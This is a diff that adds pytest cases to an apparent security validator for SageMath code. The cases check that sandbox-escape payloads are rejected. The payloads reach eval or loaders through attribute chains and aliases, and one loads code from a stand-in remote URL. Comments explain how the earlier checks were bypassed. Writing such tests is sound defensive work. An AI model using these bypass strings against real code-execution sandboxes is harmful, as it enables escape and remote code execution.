@@ -272,3 +272,53 @@ def test_prelude_rejects_names_that_are_not_identifiers() -> None:
         _sage_prelude(["x', sage_eval('1+1'), 'y"])
     # Ordinary names still work.
     assert "'a'" in _sage_prelude(["a"])
+
+
+# --- Reaching a forbidden function through an attribute chain -----------------
+# The name checks look at bare Name nodes and Call.func. `sage` is an allowed
+# import root and none of its segments are forbidden, so the same function is
+# reachable one dot further along: sage.misc.sage_eval.sage_eval(...) returned
+# the container uid. The string is invisible to the validator, exactly as in
+# item 18 -- only the path to it is different.
+ATTRIBUTE_PATH_PAYLOADS = [
+    ("sage.misc.sage_eval", "sage.misc.sage_eval.sage_eval('__import__(\"os\").getuid()')"),
+    ("sage.all.sage_eval", "sage.all.sage_eval('1')"),
+    ("sage.repl.preparse", "sage.repl.preparse.preparse('2^3')"),
+    ("nested attribute eval", "sage.misc.sage_eval.sage_eval"),
+    ("persist.load", "sage.misc.persist.load('/tmp/x')"),
+]
+
+
+@pytest.mark.parametrize(
+    "label,payload", ATTRIBUTE_PATH_PAYLOADS, ids=[p[0] for p in ATTRIBUTE_PATH_PAYLOADS]
+)
+def test_forbidden_functions_are_blocked_through_attribute_paths(label, payload) -> None:
+    with pytest.raises(SecurityViolation):
+        validate_module(ast.parse(payload), code=payload, policy=SECURITY_POLICY)
+
+
+# Sage's loaders execute code from a path -- and `load` accepts a URL, so this is
+# remote code execution, not merely local file reading. Neither was forbidden.
+LOADER_PAYLOADS = [
+    ("load", "load('/tmp/payload.sage')"),
+    ("attach", "attach('/tmp/payload.sage')"),
+    ("load a URL", "load('https://example.invalid/payload.sage')"),
+    ("aliased load", "runner = load\nrunner('/tmp/payload.sage')"),
+]
+
+
+@pytest.mark.parametrize("label,payload", LOADER_PAYLOADS, ids=[p[0] for p in LOADER_PAYLOADS])
+def test_sage_loaders_are_blocked(label, payload) -> None:
+    with pytest.raises(SecurityViolation):
+        validate_module(ast.parse(payload), code=payload, policy=SECURITY_POLICY)
+
+
+def test_ordinary_sage_attribute_use_still_works() -> None:
+    """The gate is the final name, not the presence of a dot."""
+    for code in (
+        "sage.functions.log.exp(1)",
+        "matrix([[1, 2], [3, 4]]).determinant()",
+        "sage.rings.integer.Integer(5)",
+        "plot(sin(x), (x, 0, 1)).matplotlib()",
+    ):
+        validate_module(ast.parse(code), code=code, policy=SECURITY_POLICY)
